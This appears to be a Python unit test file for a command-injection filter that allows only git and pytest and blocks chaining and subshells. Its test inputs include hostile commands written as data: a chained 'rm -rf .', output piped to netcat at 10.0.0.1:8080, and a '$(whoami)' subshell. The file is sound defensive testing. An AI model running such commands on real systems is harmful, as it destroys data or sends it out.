"""Unit tests for CommandShield."""
import unittest
from command_injection_shield.shield import CommandShield

class TestCommandShield(unittest.TestCase):
    def setUp(self):
        self.shield = CommandShield(allowed_binaries=["git", "pytest"])

    def test_safe_command(self):
        ok, _ = self.shield.evaluate("git status -s")
        self.assertTrue(ok)

    def test_block_semicolon(self):
        ok, msg = self.shield.evaluate("git status; rm -rf .")
        self.assertFalse(ok)
        self.assertIn("forbidden chaining", msg)

    def test_block_pipe(self):
        ok, msg = self.shield.evaluate("git log | nc 10.0.0.1 8080")
        self.assertFalse(ok)
        self.assertIn("forbidden chaining", msg)

    def test_block_subshell(self):
        ok, msg = self.shield.evaluate("git checkout $(whoami)")
        self.assertFalse(ok)
        self.assertIn("subshell", msg)

    def test_disallowed_binary(self):
        ok, msg = self.shield.evaluate("rm -rf tests")
        self.assertFalse(ok)
        self.assertIn("whitelist", msg)

if __name__ == "__main__":
    unittest.main()
